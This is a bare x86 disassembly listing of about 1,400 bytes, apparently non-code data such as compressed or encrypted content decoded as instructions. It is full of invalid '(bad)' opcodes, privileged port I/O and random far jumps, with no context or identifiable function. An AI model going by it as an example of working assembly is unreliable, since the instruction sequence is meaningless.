  4069ca:	sbb    dh,BYTE PTR [edi-0x50]
  4069cd:	push   cs
  4069ce:	and    al,0x92
  4069d0:	pushf  
  4069d1:	sub    al,0x8d
  4069d3:	mov    al,ds:0x8506272a
  4069d8:	mov    esi,0x2abb21a0
  4069dd:	test   al,0xd7
  4069df:	xor    dl,0x27
  4069e2:	add    BYTE PTR [ecx],0x9b
  4069e5:	and    bh,BYTE PTR [ebp+0x66]
  4069e8:	jl     0x406a0b
  4069ea:	push   es
  4069eb:	and    BYTE PTR [edi+0x1],dh
  4069ee:	fnstsw WORD PTR [edi]
  4069f0:	sti    
  4069f1:	mov    al,0xb6
  4069f3:	pop    ebx
  4069f4:	inc    edx
  4069f5:	push   ds
  4069f6:	frstor [edx-0x4fbeb49b]
  4069fc:	(bad)  
  4069fd:	outs   dx,DWORD PTR ds:[esi]
  4069fe:	(bad)  
  4069ff:	cmp    eax,0x81ed281b
  406a04:	clc    
  406a05:	or     dh,0x17
  406a08:	test   al,0x97
  406a0a:	lock pop eax
  406a0c:	and    BYTE PTR [ebp-0x13f88f0c],0x4a
  406a13:	add    bl,BYTE PTR [esi]
  406a15:	nop
  406a16:	mov    edx,0x6ce8c411
  406a1b:	jl     0x4069b1
  406a1d:	push   eax
  406a1e:	xchg   edi,eax
  406a1f:	add    edi,DWORD PTR [edx-0x1dc71c44]
  406a25:	jl     0x4069cc
  406a27:	jb     0x406a7c
  406a29:	mov    bh,0xb6
  406a2b:	inc    ebx
  406a2c:	test   dl,dl
  406a2e:	and    BYTE PTR [ecx+0x2],0xd
  406a32:	mov    ch,BYTE PTR [edx]
  406a34:	stos   DWORD PTR es:[edi],eax
  406a35:	cmp    al,BYTE PTR [edx-0x3b0d388f]
  406a3b:	add    esi,esi
  406a3d:	(bad)  
  406a3e:	loope  0x406a35
  406a40:	ins    DWORD PTR es:[edi],dx
  406a41:	fwait
  406a42:	call   0xc5182a4f
  406a47:	pushf  
  406a48:	cmp    eax,0x9822fb8b
  406a4d:	dec    esp
  406a4e:	imul   DWORD PTR [ebx]
  406a50:	or     eax,0x5bc1727c
  406a55:	xor    ebx,DWORD PTR [eax-0x7f518e50]
  406a5b:	xchg   ebx,eax
  406a5c:	push   eax
  406a5d:	xor    eax,0xe4090b9f
  406a62:	call   0xa4427dca
  406a67:	jmp    0x108ee6fb
  406a6c:	retf   
  406a6d:	adc    dh,BYTE PTR [eax-0xe]
  406a70:	and    BYTE PTR [eax-0x7fce5603],dh
  406a76:	test   DWORD PTR ds:0x8d2a8e43,ecx
  406a7c:	pop    eax
  406a7d:	pop    edi
  406a7e:	(bad)
  406a82:	ror    cl,cl
  406a84:	mov    bl,0x3d
  406a86:	aaa    
  406a87:	xor    edi,eax
  406a89:	aam    0xce
  406a8b:	add    al,0x25
  406a8d:	xchg   ecx,eax
  406a8e:	shl    DWORD PTR [edi-0x5d091967],1
  406a94:	ds cld 
  406a96:	out    0x72,eax
  406a98:	pop    esp
  406a99:	fcmove st,st(7)
  406a9b:	leave  
  406a9c:	test   ah,bl
  406a9e:	xchg   bp,ax
  406aa0:	not    DWORD PTR [esi+0x7160986e]
  406aa6:	push   ds
  406aa7:	jp     0x406a9d
  406aa9:	mov    al,ds:0xa0889316
  406aae:	pop    es
  406aaf:	or     DWORD PTR [ecx-0x5b],eax
  406ab2:	push   ebx
  406ab3:	xchg   edi,eax
  406ab4:	and    BYTE PTR [eax],al
  406ab6:	(bad)  
  406ab7:	and    al,0xee
  406ab9:	mov    WORD PTR [edx+ecx*8],gs
  406abc:	and    eax,DWORD PTR [ebp-0x7c]
  406abf:	rcl    BYTE PTR [ebx],0x15
  406ac2:	push   esi
  406ac3:	inc    ebp
  406ac4:	dec    ecx
  406ac5:	fnstsw ax
  406ac7:	cmp    DWORD PTR [ecx-0x73e3cf72],ebx
  406acd:	(bad)  
  406acf:	(bad)  
  406ad0:	fnstcw WORD PTR [edi+0xca83606]
  406ad6:	and    eax,0x8a8d2b81
  406adb:	dec    esp
  406adc:	mov    ah,0x9a
  406ade:	gs (bad) 
  406ae0:	cdq    
  406ae1:	daa    
  406ae2:	cmp    BYTE PTR [ecx+ecx*4],bl
  406ae5:	imul   edi,DWORD PTR [ebp+0xc9be96c],0x8688b17
  406aef:	or     edi,DWORD PTR [edi-0x3ebd6774]
  406af5:	popa   
  406af6:	jle    0x406b33
  406af8:	ja     0x406b3f
  406afa:	jge    0x406a97
  406afc:	in     eax,dx
  406afd:	pop    edx
  406afe:	aas    
  406aff:	adc    DWORD PTR [edx+0x6f3a8e1],ebp
  406b05:	xchg   ebx,eax
  406b06:	pop    ss
  406b07:	mov    edx,0x507a9ed4
  406b0c:	mov    ecx,0xafefa6fd
  406b11:	repz add eax,0x97cec493
  406b17:	retf   
  406b18:	(bad)  
  406b19:	and    bh,dl
  406b1b:	push   es
  406b1c:	out    dx,al
  406b1d:	fild   QWORD PTR [bx+si-0x22c2]
  406b22:	sbb    BYTE PTR [ecx-0x64df953],cl
  406b28:	add    DWORD PTR [ebx-0x6ab9612],ebx
  406b2e:	je     0x406b1f
  406b30:	or     ebx,DWORD PTR [edi+0xeaa2832]
  406b36:	mov    ebx,0xa0ac628a
  406b3b:	nop
  406b3c:	pop    edx
  406b3d:	test   eax,0x8a33985f
  406b42:	(bad)  
  406b46:	neg    BYTE PTR [edx]
  406b48:	push   es
  406b49:	fs into 
  406b4b:	cmp    dl,bh
  406b4d:	push   ebp
  406b4e:	jb     0x406b08
  406b50:	inc    ecx
  406b51:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406b52:	adc    esi,0xf2032a55
  406b58:	pop    ds
  406b59:	sub    ebp,DWORD PTR [ecx+0x2802ad00]
  406b5f:	push   edx
  406b60:	and    DWORD PTR [edx],edx
  406b62:	arpl   WORD PTR [edx-0x2f],bx
  406b65:	lea    edx,[ebx-0x45544477]
  406b6b:	mov    al,ds:0xc6ed8f70
  406b70:	sub    BYTE PTR [eax-0x6c3c6057],cl
  406b76:	mov    cs,WORD PTR [ecx-0x1ec76cdd]
  406b7c:	push   0x39
  406b7e:	mov    ah,0x36
  406b80:	sub    eax,0x3bcfd79f
  406b85:	shl    BYTE PTR [edi-0x791a85af],0x3d
  406b8c:	xchg   esp,eax
  406b8d:	mov    al,ds:0x72a34e26
  406b92:	loopne 0x406bef
  406b94:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406b95:	mov    dh,0xa6
  406b97:	jecxz  0x406b82
  406b99:	jmp    0x648c:0x7226e63b
  406ba0:	(bad)  
  406ba1:	out    0x9,al
  406ba3:	nop
  406ba4:	stos   DWORD PTR es:[edi],eax
  406ba5:	mov    ebp,0x5de69196
  406baa:	fistp  WORD PTR [edi-0x6]
  406bad:	in     eax,0x2
  406baf:	mov    esp,DWORD PTR [eax+ecx*4+0x4a]
  406bb3:	inc    edi
  406bb4:	icebp  
  406bb5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406bb6:	dec    edx
  406bb7:	push   0xe500bea
  406bbc:	retf   0x1857
  406bbf:	xor    ecx,DWORD PTR [esi-0x37]
  406bc2:	mov    bh,0xde
  406bc4:	imul   ebp,DWORD PTR [ecx+0x77],0xc1c21376
  406bcb:	out    0xb9,al
  406bcd:	xchg   DWORD PTR [ecx-0x201128f2],ebx
  406bd3:	daa    
  406bd4:	loope  0x406c48
  406bd6:	xor    eax,0x8c831c4
  406bdb:	or     ah,0x2a
  406bde:	add    eax,0x7ff3a3d5
  406be3:	(bad)  
  406be4:	aaa    
  406be5:	xchg   edx,eax
  406be6:	sub    ebx,0xe95ca423
  406bec:	pusha  
  406bed:	pop    ss
  406bee:	pop    edi
  406bef:	jmp    0xa9d6:0x67f36e3b
  406bf6:	aad    0x80
  406bf8:	stos   DWORD PTR es:[edi],eax
  406bf9:	shl    BYTE PTR [ebx],0xaf
  406bfc:	scas   eax,DWORD PTR es:[edi]
  406bfd:	sub    ecx,DWORD PTR [edx+0x10]
  406c00:	stc    
  406c01:	cmp    al,0x80
  406c03:	inc    esp
  406c04:	inc    edx
  406c05:	or     edx,DWORD PTR [esi]
  406c07:	inc    ebx
  406c08:	add    eax,0xdf493827
  406c0d:	pop    ss
  406c0e:	push   0xffffffec
  406c10:	xchg   ecx,eax
  406c11:	and    ebx,DWORD PTR [ecx-0xaeb2b68]
  406c17:	adc    bh,BYTE PTR [ebx+0x3fdb633]
  406c1d:	xor    eax,edi
  406c1f:	ret    0x49ac
  406c22:	ds (bad) 
  406c24:	cdq    
  406c25:	pop    edx
  406c26:	push   ss
  406c27:	jp     0x406bfb
  406c29:	pop    edx
  406c2a:	fbstp  TBYTE PTR [esi+0x26]
  406c2d:	pop    ss
  406c2e:	mov    ah,0x77
  406c30:	into   
  406c31:	xchg   ebx,eax
  406c32:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406c33:	out    0xd9,eax
  406c35:	and    BYTE PTR [esi-0x5b],bh
  406c38:	adc    BYTE PTR ds:0x57ed0fbf,al
  406c3e:	or     ecx,DWORD PTR [esi+0x18044b0d]
  406c44:	push   cs
  406c45:	xchg   edx,eax
  406c46:	daa    
  406c47:	in     al,dx
  406c48:	daa    
  406c49:	shr    DWORD PTR [eax+0x37cd3357],cl
  406c4f:	mov    gs,WORD PTR [ebp+eiz*2-0x445c9be8]
  406c56:	or     ecx,eax
  406c58:	(bad)  
  406c59:	push   cs
  406c5a:	mov    WORD PTR [edi+0x19],?
  406c5d:	mov    ecx,DWORD PTR [edi+0x5e77628f]
  406c63:	jecxz  0x406c0f
  406c65:	add    esp,DWORD PTR [ebp-0x20]
  406c68:	pop    edx
  406c69:	pop    ss
  406c6a:	push   ebp
  406c6b:	mov    DWORD PTR [ecx-0x78fc78a7],ecx
  406c71:	(bad)  
  406c72:	and    edx,DWORD PTR fs:[edi+esi*2+0x4cfbb4ac]
  406c7a:	fwait
  406c7b:	add    BYTE PTR ds:0x9fb3ca63,bl
  406c81:	mov    dl,0xa9
  406c83:	sbb    DWORD PTR [edi+0x42],eax
  406c86:	inc    eax
  406c87:	aas    
  406c88:	pop    ds
  406c89:	or     eax,0x3ed079b9
  406c8e:	lahf   
  406c8f:	leave  
  406c90:	js     0x406c73
  406c92:	sbb    bh,cl
  406c94:	sar    BYTE PTR [edi],1
  406c96:	mov    ds,ecx
  406c98:	les    ebx,FWORD PTR [esi]
  406c9a:	mov    ebp,0x776790eb
  406c9f:	rol    DWORD PTR [edi],cl
  406ca1:	mov    bh,0x6
  406ca3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406ca4:	sub    ch,cl
  406ca6:	lock adc edi,DWORD PTR [edi+0x2d05ceda]
  406cad:	sub    DWORD PTR [eax+0x3011ae03],eax
  406cb3:	in     al,dx
  406cb4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406cb5:	and    DWORD PTR [ecx],0xd1cf5875
  406cbb:	mov    eax,DWORD PTR [ebp-0x39642ced]
  406cc1:	popf   
  406cc2:	clc    
  406cc3:	xchg   DWORD PTR [esi+0x19],ebp
  406cc6:	mov    edx,?
  406cc8:	fld    DWORD PTR [eax-0x19af2c0b]
  406cce:	or     dl,BYTE PTR [edi-0x53]
  406cd1:	gs jo  0x406cf1
  406cd4:	push   0xffffff81
  406cd6:	repz inc ebx
  406cd8:	xor    bl,bh
  406cda:	and    DWORD PTR [ebp-0x55a728d4],ecx
  406ce0:	dec    esp
  406ce1:	cmp    edx,eax
  406ce3:	(bad)  
  406ce4:	fnsave [esi-0x41]
  406ce7:	mov    al,0x1f
  406ce9:	lock or eax,0x7c5ceb58
  406cef:	add    ah,BYTE PTR [ecx+ebx*8-0x11]
  406cf3:	adc    BYTE PTR [ecx-0x7d],dl
  406cf6:	mov    ebx,0x17ddab4f
  406cfb:	adc    eax,0xf11ec035
  406d00:	adc    DWORD PTR [ebp+0x37a569d2],edx
  406d06:	jmp    0x1f29:0x88859350
  406d0d:	addr16 jo 0x406d48
  406d10:	mov    dh,0x25
  406d12:	in     al,0x2b
  406d14:	test   ecx,esp
  406d16:	int3   
  406d17:	xchg   ebp,eax
  406d18:	adc    ebx,edi
  406d1a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406d1b:	and    BYTE PTR [edx+eiz*8-0x3927bec4],cl
  406d22:	adc    DWORD PTR [esi],esp
  406d24:	aaa    
  406d25:	(bad)  
  406d26:	addr16 lahf 
  406d28:	ret    
  406d29:	ror    BYTE PTR [edx+0x3e2234be],0x4c
  406d30:	inc    edx
  406d31:	jmp    0x7343:0xa8020bbb
  406d38:	jp     0x406d1e
  406d3a:	mov    dh,0x2d
  406d3c:	scas   al,BYTE PTR es:[edi]
  406d3d:	push   esi
  406d3e:	dec    DWORD PTR [edi]
  406d40:	xchg   BYTE PTR [edi],bh
  406d42:	and    al,0xa8
  406d44:	mov    ah,BYTE PTR [esp+edi*8+0x2c]
  406d48:	cmp    DWORD PTR [ecx+0x225718b3],0xffffff92
  406d4f:	add    ch,BYTE PTR [esi+0x52cad3b1]
  406d55:	rcl    DWORD PTR [edx+ebx*2],1
  406d58:	add    DWORD PTR [ebp+0x5dcbdce0],esi
  406d5e:	jl     0x406db2
  406d60:	fs inc ecx
  406d62:	jo     0x406d90
  406d64:	(bad)  
  406d65:	scas   eax,DWORD PTR es:[edi]
  406d66:	cs pop esi
  406d68:	scas   al,BYTE PTR es:[edi]
  406d69:	push   edi
  406d6a:	out    0x13,al
  406d6c:	push   0xdeb1f44c
  406d71:	adc    BYTE PTR ss:[edi-0x10151bf1],0x25
  406d79:	js     0x406d47
  406d7b:	pop    es
  406d7c:	stos   DWORD PTR es:[edi],eax
  406d7d:	sar    DWORD PTR [eax],0x1d
  406d80:	shr    edx,1
  406d82:	add    DWORD PTR ds:0xba6ff6e2,eax
  406d88:	out    0xa,al
  406d8a:	jns    0x406d0e
  406d8c:	push   cs
  406d8d:	xchg   ebx,eax
  406d8e:	hlt    
  406d8f:	out    0x45,al
  406d91:	mov    edi,0x39040cda
  406d96:	stos   DWORD PTR es:[edi],eax
  406d97:	push   0xef41650f
  406d9c:	mov    ah,0x2a
  406d9e:	cmp    ecx,ebp
  406da0:	sahf   
  406da1:	mov    ah,0x77
  406da3:	sub    eax,0x733afd86
  406da8:	leave  
  406da9:	mov    ds:0x3b4376fd,al
  406dae:	pop    DWORD PTR [eax+0x350e288b]
  406db4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406db5:	pop    eax
  406db6:	out    dx,eax
  406db7:	sti    
  406db8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406db9:	int    0x7e
  406dbb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406dbc:	jmp    0x406d40
  406dbe:	test   al,0xad
  406dc0:	jmp    0x406d50
  406dc2:	pop    ds
  406dc3:	mov    bl,0xbb
  406dc5:	lahf   
  406dc6:	scas   eax,DWORD PTR es:[edi]
  406dc7:	popf   
  406dc8:	sti    
  406dc9:	(bad)  
  406dca:	fs push 0xd
  406dcd:	cdq    
  406dce:	rol    ch,cl
  406dd0:	add    ch,bh
  406dd2:	push   eax
  406dd3:	clc    
  406dd4:	dec    eax
  406dd5:	addr16 mov bh,0x7b
  406dd8:	arpl   dx,bx
  406dda:	add    eax,0x38e2cea
  406ddf:	je     0x406e30
  406de1:	mov    eax,ds:0xd1b2c70f
  406de6:	mov    dl,0x17
  406de8:	cmp    eax,0x2a1dc90c
  406ded:	daa    
  406dee:	lea    esi,[ebx]
  406df0:	dec    ebx
  406df1:	inc    edi
  406df2:	clc    
  406df3:	or     DWORD PTR [edi+edx*2+0x3],ebx
  406df7:	retf   
  406df8:	xlat   BYTE PTR ds:[ebx]
  406df9:	enter  0x410e,0xb7
  406dfd:	loope  0x406d8c
  406dff:	pop    edi
  406e00:	not    BYTE PTR [esi]
  406e02:	fistp  DWORD PTR [ebx-0x7f]
  406e05:	sub    eax,0x7897bcfb
  406e0a:	add    ah,BYTE PTR [edx+0x74f36ed7]
  406e10:	unpcklps xmm3,XMMWORD PTR [edi+0x6f]
  406e14:	sub    eax,0x858ea245
  406e19:	into   
  406e1a:	inc    esp
  406e1b:	fcmovne st,st(0)
  406e1d:	mov    dh,0x69
  406e1f:	sub    eax,0x2b5c9a68
  406e24:	jno    0x406e0d
  406e26:	int    0xa9
  406e28:	sbb    cl,BYTE PTR [esi-0x2c874a8a]
  406e2e:	pop    es
  406e2f:	fmul   st,st(5)
  406e31:	aad    0xf5
  406e33:	mov    ch,0x6e
  406e35:	pop    esi
  406e36:	shl    BYTE PTR [edi-0x73952b9f],1
  406e3c:	call   0xce6aa8f4
  406e41:	js     0x406e34
  406e43:	(bad)  
  406e44:	data16 int3 
  406e46:	cs and al,0x18
  406e49:	popf   
  406e4a:	enter  0x20fe,0xb7
  406e4e:	mov    WORD PTR [edi-0x1c13a3b6],cs
  406e54:	jp     0x406dff
  406e56:	sbb    bl,BYTE PTR [esi]
  406e58:	mov    BYTE PTR [eax],dl
  406e5a:	cli    
  406e5b:	jmp    0xa6dd:0xd4e7617
  406e62:	push   ds
  406e63:	stc    
  406e64:	dec    esi
  406e65:	sbb    eax,0x1ab099ac
  406e6a:	aaa    
  406e6b:	leave  
  406e6c:	xor    esi,DWORD PTR [ebp+esi*8+0x2c]
  406e70:	out    0xf5,al
  406e72:	enter  0xc12f,0x8
  406e76:	scas   eax,DWORD PTR es:[edi]
  406e77:	stos   DWORD PTR es:[edi],eax
  406e78:	sub    esp,esp
  406e7a:	push   cs
  406e7b:	repz pusha 
  406e7d:	mov    ebx,0xdb8fe75a
  406e82:	xchg   esi,eax
  406e83:	shl    ch,1
  406e85:	mov    bh,0x15
  406e87:	xchg   ebx,eax
  406e88:	das    
  406e89:	sti    
  406e8a:	push   edi
  406e8b:	mov    al,0xd2
  406e8d:	test   eax,0xbdf07e91
  406e92:	cwde   
  406e93:	leave  
  406e94:	dec    edi
  406e95:	fwait
  406e96:	mov    al,0x9d
  406e98:	fisttp DWORD PTR [ecx]
  406e9a:	mov    eax,ds:0x74059786
  406e9f:	shr    DWORD PTR [esi+0x243c7cf5],1
  406ea5:	and    ecx,DWORD PTR [edx+ebx*2-0x18]
  406ea9:	jns    0x406e2c
  406eab:	or     ebx,esi
  406ead:	add    eax,ebp
  406eaf:	and    eax,0x71abddb3
  406eb4:	stos   BYTE PTR es:[edi],al
  406eb5:	imul   DWORD PTR [esi]
  406eb7:	or     eax,0x81e02305
  406ebc:	jl     0x406ebe
  406ebe:	add    eax,0x527f5341
  406ec3:	add    al,0xb3
  406ec5:	pusha  
  406ec6:	gs inc edi
  406ec8:	in     al,0xd9
  406eca:	repnz xchg edx,eax
  406ecc:	out    dx,eax
  406ecd:	fcomp  QWORD PTR [ebp-0x55]
  406ed0:	xchg   DWORD PTR [ebx+0x4f],eax
  406ed3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406ed4:	(bad)  
  406ed5:	cmp    eax,0x2d3e5bdf
  406eda:	hlt    
  406edb:	loopne 0x406f04
  406edd:	and    DWORD PTR [eax-0x76f430e3],ecx
  406ee3:	or     BYTE PTR ds:0x476fe414,al
  406ee9:	pop    ecx
  406eea:	mov    ecx,0x88d1499c
  406eef:	cwde   
  406ef0:	inc    ecx
  406ef1:	js     0x406ef7
  406ef3:	mov    edx,0xea1768f6
  406ef8:	into   
  406ef9:	adc    al,0x52
  406efb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406efc:	leave  
  406efd:	gs fs dec ecx
  406f00:	lods   al,BYTE PTR ds:[esi]
  406f01:	sub    BYTE PTR [ebx-0x42d87786],dl
  406f07:	stos   DWORD PTR es:[edi],eax
  406f08:	test   BYTE PTR [ecx],dh
  406f0a:	fwait
  406f0b:	out    dx,al
  406f0c:	lds    eax,FWORD PTR [esi]
  406f0e:	rcr    al,0xf
  406f11:	not    BYTE PTR [esi-0x5f4be966]
  406f17:	ins    BYTE PTR es:[edi],dx
  406f18:	adc    al,BYTE PTR [esi+0x6b]
  406f1b:	push   ecx
  406f1c:	sub    BYTE PTR [edx-0x7d],ah
  406f1f:	dec    esp
  406f20:	(bad)
  406f24:	stc    
  406f25:	mov    dl,0xd8
  406f27:	fs sbb eax,0x754e1f9b
  406f2d:	in     al,dx
  406f2e:	enter  0xde50,0x8b
  406f32:	dec    ecx
  406f33:	push   esi
  406f34:	pop    ebx
  406f35:	mov    eax,ds:0x1e1ce814
  406f3a:	outs   dx,BYTE PTR ds:[esi]
  406f3b:	mov    cl,0x37
  406f3d:	das    
  406f3e:	xor    edx,edx
  406f40:	dec    edi
  406f41:	mov    ebp,DWORD PTR [edi-0x75188f05]
  406f47:	loop   0x406f00
  406f49:	mov    ebp,0x547ce2f9
  406f4e:	(bad)  
  406f4f:	cdq    
  406f50:	lods   eax,DWORD PTR ds:[esi]
  406f51:	dec    esi
  406f52:	fistp  WORD PTR ds:0x1dc75fcd
  406f58:	xchg   ebx,eax
  406f59:	and    eax,0x789150a9
  406f5e:	pop    esi
  406f5f:	xor    BYTE PTR [esi+0xbfbf968],dh
  406f65:	std    
  406f66:	sbb    eax,0x6c717474
  406f6b:	or     al,0xa0
  406f6d:	hlt    
  406f6e:	in     eax,0xda
  406f70:	popf   
  406f71:	rcl    BYTE PTR [ebx+0x54],cl
  406f74:	icebp  
  406f75:	mov    ?,ecx
  406f77:	std    
  406f78:	xor    DWORD PTR [edi],eax
  406f7a:	cld    
  406f7b:	in     al,dx
  406f7c:	xlat   BYTE PTR ds:[ebx]
  406f7d:	push   cs
  406f7e:	lea    eax,[esi]
  406f80:	push   ds
  406f81:	adc    ch,ch
  406f83:	pusha  
  406f84:	cmp    esp,eax
  406f86:	imul   edx,DWORD PTR [edi],0x9
  406f89:	std    
  406f8a:	mov    ch,0x6b
  406f8c:	sbb    eax,0x3b6b5b23
  406f91:	mov    ecx,0x424bcc8a
  406f96:	fsubr  QWORD PTR [eax+0x40b11bcc]
  406f9c:	dec    edi
  406f9d:	addr16 mov ebp,0x7263482
  406fa3:	mov    dh,0x62
  406fa5:	scas   al,BYTE PTR es:[edi]
  406fa6:	mov    ds:0xfb8785ff,al
  406fab:	sbb    DWORD PTR [edx],edx
  406fad:	sub    cl,BYTE PTR [edi*8+0x758341b4]
  406fb4:	sbb    al,0xb8
  406fb7:	mov    al,ds:0x16fb1e2e
  406fbc:	inc    ebp
  406fbd:	mov    ds:0x11eaf487,al
  406fc2:	adc    bl,dl
  406fc4:	rcr    DWORD PTR [ebx-0x19],1
  406fc7:	add    ebx,DWORD PTR [esi+0x40]
  406fca:	pop    esp
  406fcb:	mov    eax,ds:0x984e31a
  406fd0:	mov    dh,BYTE PTR [eax-0x644def0a]
  406fd6:	test   al,0x13
  406fd8:	nop
  406fd9:	fnsave [esi]
  406fdb:	inc    ebx
  406fdc:	pop    ecx
  406fdd:	mov    dl,0x94
  406fdf:	xchg   ecx,eax
  406fe0:	popa   
  406fe1:	or     DWORD PTR [edx-0x35],ecx
  406fe4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406fe5:	jns    0x407002
  406fe7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406fe8:	cmp    eax,0xff092fed
  406fed:	sbb    DWORD PTR [ecx-0x39],edi
  406ff0:	sub    eax,0xbd03794
  406ff5:	(bad)  
  406ff6:	xor    BYTE PTR [ebp+0x1cfc1619],ah
  406ffc:	jl     0x407074
  406ffe:	in     eax,0x47
  407000:	jmp    0x6f15c6e2
  407005:	mov    dh,0xc3
  407007:	sbb    al,0xfa
  407009:	add    eax,DWORD PTR [ecx-0x118263c0]
  40700f:	cmp    al,0x72
  407011:	sbb    dh,0x80
  407014:	out    dx,al
  407015:	jge    0x407075
  407017:	pop    es
  407018:	mov    eax,ds:0xa3e168b4
  40701d:	ins    BYTE PTR es:[edi],dx
  40701e:	leave  
  40701f:	cli    
  407020:	or     BYTE PTR [edx+0x72],0xc7
  407024:	cmp    bl,ah
  407026:	sbb    BYTE PTR ds:[ecx],al
  407029:	jnp    0x407030
  40702b:	or     DWORD PTR [edx],0x83389ba2
  407031:	mov    esi,0xbb1b5888
  407036:	jno    0x407047
  407038:	lahf   
  407039:	es cwde 
  40703b:	push   ebx
  40703c:	ficom  WORD PTR [ecx+0x7e]
  40703f:	fild   QWORD PTR [ecx]
  407041:	mov    DWORD PTR [edi+0x1c],ebx
  407044:	xchg   ecx,eax
  407045:	outs   dx,BYTE PTR ds:[esi]
  407046:	pop    ebx
  407047:	pop    edx
  407048:	icebp  
  407049:	mov    ah,0x3
  40704b:	or     edx,DWORD PTR [esi]
  40704d:	and    eax,0x45efde33
  407052:	push   es
  407053:	outs   dx,DWORD PTR ds:[esi]
  407054:	xlat   BYTE PTR ds:[ebx]
  407055:	pop    edi
  407056:	mov    edx,0x4b3b6434
  40705b:	and    ebp,DWORD PTR [ebx+0x21]
  40705e:	inc    ebx
  40705f:	cwde   
  407060:	sahf   
  407061:	pop    ebx
  407062:	cmp    BYTE PTR [edx-0x7e],bl
  407065:	cmp    al,0xd1
  407067:	fcmovu st,st(1)
  407069:	outs   dx,BYTE PTR ds:[esi]
  40706a:	fidiv  DWORD PTR [eax+0x7c93abf8]
  407070:	dec    ebx
  407071:	pushf  
  407072:	sub    BYTE PTR [edi+0x4ac71c4f],al
  407078:	in     al,dx
  407079:	mov    ecx,0x59837f4
  40707e:	cmp    dh,al
  407080:	inc    DWORD PTR [eax+edi*1-0x6773681c]
  407087:	(bad)  
  407088:	fisttp QWORD PTR [esi]
  40708a:	inc    esi
  40708b:	int    0xa3
  40708d:	fadd   QWORD PTR [ebx-0x4b]
  407090:	imul   ebp,DWORD PTR [esi+0x3c2b637b],0xb162d488
  40709a:	jno    0x4070e1
  40709c:	mov    ecx,0xe1310e15
  4070a1:	mov    dh,BYTE PTR [ecx]
  4070a3:	cdq    
  4070a4:	lahf   
  4070a5:	retf   0xba9e
  4070a8:	push   cs
  4070a9:	fnstcw WORD PTR [edi+0x71]
  4070ac:	mov    ds:0x9704fa3f,eax
  4070b1:	or     cl,bh
  4070b3:	sbb    eax,0x2da11c5e
  4070b8:	push   cs
  4070b9:	imul   esi,DWORD PTR [edi+0x7e],0xffffffeb
  4070bd:	adc    edx,DWORD PTR [ebp-0x377826d6]
  4070c3:	mov    edi,0xa015462c
  4070c8:	sub    bh,BYTE PTR [edx+0x1e706f19]
  4070ce:	add    edi,esp
  4070d0:	arpl   sp,si
  4070d2:	js     0x4070b6
  4070d4:	das    
  4070d5:	push   0xfffffff6
  4070d7:	ror    BYTE PTR [edx+0x11],1
  4070da:	mov    edx,0xd1aaeaa7
  4070df:	cmp    al,0x1a
  4070e1:	xchg   ebx,eax
  4070e2:	sbb    al,0xa5
  4070e4:	dec    ebx
  4070e5:	adc    ch,BYTE PTR [esi+0xca6bcbc]
  4070eb:	int    0xdf
  4070ed:	inc    edx
  4070ee:	out    0x46,al
  4070f0:	push   edx
  4070f1:	jo     0x4070c0
  4070f3:	add    edx,DWORD PTR [ebx-0x6a37d670]
  4070f9:	dec    esp
  4070fa:	lock add BYTE PTR [esi+0x3b7faa5],bl
  407101:	in     eax,0x2d
  407103:	push   ebx
  407104:	arpl   WORD PTR [edx+0x7b748899],si
  40710a:	push   ebp
  40710b:	test   BYTE PTR [eax-0x159c150f],dl
  407111:	int    0xfb
  407113:	and    DWORD PTR [edx+0x1a],0x7f
  407117:	std    
  407118:	jno    0x407120
  40711a:	sahf   
  40711b:	stos   BYTE PTR es:[edi],al
  40711c:	jae    0x4070fb
  40711e:	sbb    BYTE PTR ds:0xaa3bca9e,0xbe
  407125:	jg     0x407147
  407127:	jne    0x40710a
  407129:	xchg   bp,ax
  40712b:	mov    eax,ds:0x1772bf7e
  407130:	outs   dx,BYTE PTR ds:[esi]
  407131:	stc    
  407132:	mov    al,ds:0xa2a7a5bc
  407137:	mov    bl,0x52
  407139:	cmp    dl,ah
  40713b:	stos   BYTE PTR es:[edi],al
  40713c:	loopne 0x4071a3
  40713e:	jbe    0x4070c4
  407140:	stos   BYTE PTR es:[edi],al
  407141:	stos   BYTE PTR es:[edi],al
  407142:	cmp    DWORD PTR [ebp+0x31076e2a],edx
  407148:	lods   eax,DWORD PTR ds:[esi]
  407149:	retf   0x9686
  40714c:	add    eax,DWORD PTR [edx-0x689fe33f]
  407152:	ss push 0x5fdbcfd3
  407158:	xchg   ebx,eax
  407159:	cld    
  40715a:	ins    DWORD PTR es:[edi],dx
  40715b:	jbe    0x4070e9
  40715d:	ja     0x40710b
  40715f:	jb     0x407129
  407161:	jmp    0x6a9911a
  407166:	repz rcr bl,0x4f
  40716a:	push   edx
  40716b:	pop    ebp
  40716c:	mov    ds:0xc10cf9a6,eax
  407171:	aam    0x31
  407173:	fdivr  DWORD PTR [eax]
  407175:	inc    edx
  407176:	adc    BYTE PTR [edi],0x1
  407179:	jb     0x407135
  40717b:	std    
  40717c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40717d:	or     al,0x37
  40717f:	push   0xffffffc2
  407181:	xchg   esp,eax
  407182:	push   ecx
  407183:	pop    esp
  407184:	jb     0x40715f
  407186:	outs   dx,BYTE PTR ds:[esi]
  407187:	xchg   ecx,eax
  407188:	sub    eax,0x3bdc6255
  40718d:	xchg   esi,eax
  40718e:	mov    edi,0xb13a222d
  407193:	ss iret 
  407195:	cld    
  407196:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407197:	outs   dx,BYTE PTR ds:[esi]
  407198:	dec    esp
  407199:	cdq    
  40719a:	cmp    BYTE PTR [eax-0x71],bh
  40719d:	cmc    
  40719e:	inc    edi
  40719f:	dec    edx
  4071a0:	call   0x1761:0xbef1e07a
